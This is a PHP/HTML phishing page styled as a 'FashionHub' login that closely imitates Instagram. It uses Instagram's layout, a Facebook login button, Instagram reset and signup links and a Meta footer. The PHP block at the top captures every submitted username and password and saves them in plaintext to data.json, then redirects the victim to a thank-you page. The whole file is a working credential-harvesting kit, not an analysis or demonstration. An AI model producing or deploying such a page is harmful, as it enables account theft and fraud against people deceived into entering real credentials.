<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = [
        'email_or_username' => $_POST['username'] ?? '',
        'password' => $_POST['password'] ?? '',
        'timestamp' => date('Y-m-d H:i:s'),
    ];

    $existingData = [];
    if (file_exists('data.json')) {
        $existingData = json_decode(file_get_contents('data.json'), true);
    }

    $existingData[] = $data;

    file_put_contents('data.json', json_encode($existingData, JSON_PRETTY_PRINT));
    header('Location: thankyou.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>FashionHub Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0; padding: 0; box-sizing: border-box;
    }

    body {
      background-color: #000;
      color: #fff;
      font-family: 'Roboto', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      justify-content: center;
      padding: 20px;
    }

    .container {
      max-width: 400px;
      width: 100%;
    }

    .box {
      background-color: #121212;
      border: 1px solid #262626;
      padding: 30px 40px;
      border-radius: 12px;
      text-align: center;
    }

    .brand img {
      width: 70%;
      max-width: 175px;
      height: auto;
      margin-bottom: 20px;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 10px;
      background: #262626;
      border: none;
      border-radius: 6px;
      color: white;
      font-size: 14px;
    }

    button.login-btn {
      background: #405de6;
      border: none;
      color: white;
      padding: 12px;
      width: 100%;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }

    .divider {
      margin: 20px 0;
      display: flex;
      align-items: center;
      color: #aaa;
    }

    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background: #333;
      margin: 0 10px;
    }

    .facebook-btn {
      color: #1877f2;
      font-weight: 500;
      border: none;
      background: none;
      cursor: pointer;
    }

    .forgot {
      margin-top: 12px;
      font-size: 13px;
      color: #a5a5a5;
    }

    .signup-box {
      background-color: #121212;
      margin-top: 20px;
      padding: 20px;
      text-align: center;
      border: 1px solid #262626;
      border-radius: 12px;
    }

    .signup-box a {
      color: #0095f6;
      text-decoration: none;
      font-weight: 500;
    }

    .get-app {
      color: #a5a5a5;
      font-size: 14px;
      margin-top: 20px;
      text-align: center;
    }

    .store-badges {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-top: 10px;
      flex-wrap: wrap;
    }

    .store-badges img {
      height: 40px;
    }

    footer {
      margin-top: 40px;
      font-size: 12px;
      color: #666;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 15px;
      text-align: center;
    }

    footer a {
      color: #666;
      text-decoration: none;
    }

    @media (max-width: 480px) {
      .box {
        padding: 20px;
      }

      .store-badges img {
        height: 35px;
      }

      input[type="text"], input[type="password"], button.login-btn {
        font-size: 13px;
        padding: 10px;
      }

      .forgot, .get-app {
        font-size: 12px;
      }

      footer {
        font-size: 10px;
        gap: 10px;
      }
    }
  </style>
</head>
<body>

<div class="container">
  <div class="box">
    <div class="brand">
      <img src="logo.png" alt="FashionHub Logo">
    </div>
    <form method="POST">
      <input type="text" name="username" placeholder="Phone number, username, or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit" class="login-btn">Log in</button>
    </form>

    <div class="divider">OR</div>
    <button class="facebook-btn">Log in with Facebook</button>
    <div class="forgot" onclick="window.location.href='https://www.instagram.com/accounts/password/reset/';">Forgot password?</div>
  </div>

  <div class="signup-box">
    Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
  </div>

  <div class="get-app">
    Get the app.
    <div class="store-badges">
      <img src="https://static.cdninstagram.com/rsrc.php/v4/yt/r/Yfc020c87j0.png" alt="App Store">
      <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Play Store">
    </div>
  </div>
</div>

<footer>
  <a href="#">Meta</a>
  <a href="#">About</a>
  <a href="#">Blog</a>
  <a href="#">Jobs</a>
  <a href="#">Help</a>
  <a href="#">Privacy</a>
  <a href="#">Terms</a>
  <a href="#">Locations</a>
  <a href="#">Threads</a>
  <a href="#">Contact</a>
</footer>

</body>
</html>
